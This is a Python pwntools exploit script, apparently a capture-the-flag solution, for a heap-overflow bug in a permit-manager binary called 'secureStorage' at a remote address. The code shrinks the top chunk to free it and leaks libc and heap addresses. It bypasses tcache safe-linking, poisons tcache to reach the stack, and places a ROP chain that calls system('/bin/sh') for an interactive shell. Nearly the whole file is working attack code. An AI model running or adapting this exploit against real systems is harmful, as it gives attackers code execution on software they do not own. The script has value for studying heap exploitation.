from pwn import *
libc = ELF('./libc.so.6')# Load the libc binary (used for exploiting the libc functions)
ld = ELF('./ld-linux-x86-64.so.2')  # Load the dynamic linker binary (not used directly in this script)
secureStorage = ELF('./secureStorage') # Load the vulnerable target binary (the program we're exploiting)
 
p = process("./secureStorage")
p = remote("10.80.171.61", 1337)

# Function to wait for the prompt in the application 
def prompt():
    """
    This function waits for the prompt to appear in the application.
    It checks if the prompt contains the expected text '[4] Exit Permit Manager'.
    If not, it prints an error message and exits the script.
    """
    r = p.recvuntilS(b">> ") # Wait for the ">> " prompt to appear
    if '[4] Exit Permit Manager' not in r:  # If the expected text isn't found, something went wrong
        print("Unable to wait for prompt")
        print(r)
        sys.exit(1) # Exit the program if the prompt isn't found
 
def create(index, size, data=None):
    """
    This function sends a request to create a new permit entry in the application.
    It takes the index, size, and data as arguments, sends them to the application,
    and waits for a response to ensure the entry was created successfully.
    """
    p.sendline(b'1')
    p.recvuntil(b'Enter permit index:\n')
    p.sendline(str(index).encode())
    p.recvuntil(b'Enter entry size:\n')
    p.sendline(str(size).encode())
    r = p.readline()
    if r != b'Enter entry data:\n':
        print(f"create {index} failed:")
        print(r)
        sys.exit(1)
    p.send(data)
    prompt()
 
def edit(index, data):
    """
    This function sends a request to edit an existing permit entry in the application.
    It takes the index and new data as arguments and modifies the entry with the provided data.
    """
    p.sendline(b'3')
    p.recvuntil(b'Enter entry index:\n')
    p.sendline(str(index).encode())
    p.recvuntil(b'Enter data:\n')
    p.send(data)
    prompt()
 
def show(index):
    """
    This function sends a request to show an existing permit entry.
    It takes the index as an argument and retrieves the entry data.
    """
    p.sendline(b'2') 
    p.recvuntil(b'Enter entry index:\n')
    p.sendline(str(index).encode())
    r = p.recvuntil(b"\n[1] Create Permit Entry", drop=True)
    prompt()
    return r
 
def test():
    """
    This function is used to test the vulnerability in the program.
    It creates and edits entries to gather memory information,
    such as the wilderness size and the pointer to the main arena.
    """
    # Extract top chunk size
    create(0, 24, b"A"*24) # Create an entry of size 24
    wilderness_size = "0x"+show(0)[24:][::-1].hex() # Show the entry, reverse it, and interpret as a hex value
    log.info("Wilderness size: " + wilderness_size) # Log the wilderness size (top chunk size)
 
    # Reduce top chunk size by overflow to sysmalloc_int_free and free it to unsorted bin
    edit(0, b"A"*24+p64(eval(wilderness_size)&0xfff)) # Modify the entry to manipulate the heap's top chunk
    create(1, 3992, b"B"*3992) # Create another large entry to potentially manipulate heap structure
 
    # malloc the chunk freed to unsorted bins and leak main_arena pointer
    create(2, (eval(wilderness_size)&0xfff)-0x30, b"C"*8) # Create an entry to potentially leak memory
    main_arena_96_ptr = "0x"+show(2)[8:][::-1].hex() # Extract the main arena pointer (the area of heap management)
    log.info("(Main_Arena+96) ptr Leak: " + main_arena_96_ptr) # Log the leaked main arena pointer
 
# The main exploit function that carries out the full exploitation chain
def exploit():
    """
    This function carries out the full exploit by manipulating the heap, leaking memory,
    calculating the libc base address, and setting up a ROP chain to eventually execute system("/bin/sh").
    """
    # Extract top chunk size
    create(0, 24, b"A"*24) # Create an entry again to gather more information
    wilderness_size = "0x"+show(0)[24:][::-1].hex() # Get the wilderness size
    log.info("Wilderness size: " + wilderness_size)
 
    # Reduce top chunk size by overflow to sysmalloc_int_free and free it to unsorted bin
    edit(0, b"A"*24+p64(eval(wilderness_size)&0xfff))
    create(1, 3992, b"B"*3992)  # Create another large entry to cause further heap issues
 
    # malloc the chunk freed to unsorted bins and leak main_arena pointer
    create(2, (eval(wilderness_size)&0xfff)-0x30, b"C"*8)
    main_arena_96_ptr = "0x"+show(2)[8:][::-1].hex()
    log.info("(Main_Arena+96) ptr Leak: " + main_arena_96_ptr)
 
    # As leak_ptr is a pointer to main_arena+96, use that to calculate libc base address
    libc.address = (eval(main_arena_96_ptr)-96) - libc.symbols["main_arena"]
    log.info("Libc base: " + hex(libc.address))  # Log the calculated libc base address
 
    # Extract new top chunk size
    wilderness2_size = "0x"+show(1)[3992:][::-1].hex()
    log.info("2nd Wildness size: " + wilderness2_size)
 
    # Reduce 2nd wilderness size by overflow to sysmalloc_int_free and free it to tcache bin
    edit(1, b"B"*3992+p64(eval(wilderness2_size)&0xfff))
    create(3, 3992, b"D"*3992)  # Create more entries to manipulate heap state
 
    # Extract tcache safe linking xor value
    edit(1, b"B"*4000)
    tcache_leak = "0x"+show(1)[4000:][::-1].hex()[1:]
    heap_base = eval(tcache_leak+"000")-0x21000
 
    log.info("Tcache leak: " + tcache_leak)  # Log the tcache leak
    log.info("Heap base: " + hex(heap_base)) # Log the calculated heap base
    #log.info("Tcache size: " + str((eval(wilderness2_size)&0xfff)-0x21))
    # Modify another entry to prepare for the ROP chain
    edit(1, b"B"*3992+p64((eval(wilderness2_size)&0xfff)-0x20))
 
    # Reduce 3rd wilderness size by overflow to sysmalloc_int_free and free it to tcache bin
    edit(3, b"D"*3992+p64(eval(wilderness2_size)&0xfff))
    create(4, 3992, b"E"*3992)
 
    tcache_xor = (heap_base + 0x43000) >> 12
    target = tcache_xor ^ (libc.address+0x20ad40)
    log.info("Target: " + hex(target))
    # Change the tcache entry next to the target address
    edit(3, b"D"*3992+p64((eval(wilderness2_size)&0xfff)-0x20)+p64(target))
 
    create(5, 56, b"E")
    create(6, 56, b"F"*24)
 
    stack_leak = "0x"+show(6)[24:][::-1].hex()
    log.info("Stack leak: " + stack_leak)
 
    wilderness4_size = "0x"+show(4)[3992:][::-1].hex()
    log.info("Wilderness4 size: " + wilderness4_size)
 
    edit(4, b"E"*3992+p64(eval(wilderness4_size)&0xfff))
    create(7, 3992, b"G"*3992+p64(eval(wilderness4_size)&0xfff))
    create(8, 3992, b"H"*3992)

    # Insert our payload
    binsh = next(libc.search(b"/bin/sh"))
    log.info("Binsh: " + hex(binsh))
 
    system = libc.sym["system"]
    log.info("System: " + hex(system))
 
    exit = libc.sym["exit"]
    log.info("Exit: " + hex(exit))
 
    libc_rop = rop.ROP(ELF('./libc.so.6'))
    rdi_rop = libc.address + libc_rop.rdi.address
    log.info("RDI ROP Address: " + hex(rdi_rop))
 
    # Add ROP return address to the libc base address
    ret_rop = libc.address + libc_rop.ret.address
 
    # Create the ROP chain
    rop_chain = [
        ret_rop,
        rdi_rop,
        binsh,
        ret_rop,
        system,
        exit
    ]
 
    rop_chain = b''.join(p64(addr) for addr in rop_chain) # converted to a 64-bit little-endian representation
 
    print(len(rop_chain))
 
    tcache2_xor = (heap_base + 0x87c00) >> 12 # Shifts the value of heap_base + 0x87c00 by 12 bits to the right (essentially dividing by 2^12)
    target2 = tcache2_xor ^ (eval(stack_leak) - 0x138) # The 'target2' address is calculated by XOR-ing 'tcache2_xor' with the result of 'eval(stack_leak) - 0x138
    # Perform an 'edit' operation with index 7.
    # The payload consists of:
    # - A large buffer of 3992 'G' characters (padding to overwrite memory).
    # - A calculated value which is the wilderness4_size masked with 0xfff (extracting a specific size).
    # - The 'target2' address.
    edit(7, b"G"*3992+p64((eval(wilderness4_size)&0xfff)-0x20)+p64(target2))
 
    # - Create an object of size 56 with data "I" at index 9 (to trigger memory allocation vulnerability).
    # - Create another object at index 10 with a size of 56, passing the constructed 'rop_chain' as the data.
    create(9,56,b"I")
    create(10,56, rop_chain)
 
exploit()
 
# send "4" to cause main to return and trigger the rop
p.interactive()
